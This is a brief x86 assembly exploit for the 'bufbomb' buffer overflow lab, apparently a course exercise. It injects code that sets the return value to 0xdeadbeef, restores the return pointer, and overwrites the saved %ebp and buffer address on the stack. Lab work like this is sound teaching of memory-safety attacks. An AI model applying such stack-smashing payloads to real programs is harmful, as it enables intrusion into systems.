


#Buffer Overflow Attack for bufbomb 
 
















	
 
	pushl $ 0x8048528 	# Put correct return pointer back on stack
	movl $0xdeadbeef,%eax	# Alter return value
	ret			# Re-execute return
.align 4			# Round up to 12
	.long 0xbfffefe8 	# Saved value of %ebp
	.long 0xbfffefbc 	# Location of buf
	.long 0x00000000	# Padding
 
